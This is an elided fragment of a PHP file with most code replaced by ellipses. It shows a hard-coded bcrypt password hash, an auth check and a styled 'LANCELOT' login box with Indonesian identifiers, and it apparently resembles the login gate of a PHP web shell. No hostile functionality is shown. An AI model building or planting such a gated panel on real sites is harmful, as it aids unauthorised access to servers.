 ...
 */
     ...
     */
$password_hash = '$2a$12$eaGcgyciMnZ1dj7FzFNlMOJ20uthEMsIFqCY3gmLavAua4E8brV8.';
...
if (!$__auth__) {
    ...
    if (!$tampilkan_login) {
        ...
        <body>
            ...
            <div class="login-box">
                <div class="lancelot-icon">⚔️🗡️⚔️</div>
                <h1>LANCELOT</h1>
                <div class="subtitle">Bye Lee</div>
                <form method="post">
    ...
    <style>
        ...
        * {
        ...
        .latar-utama {
            ...
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/QVgyXW1/image.png') no-repeat center center fixed;
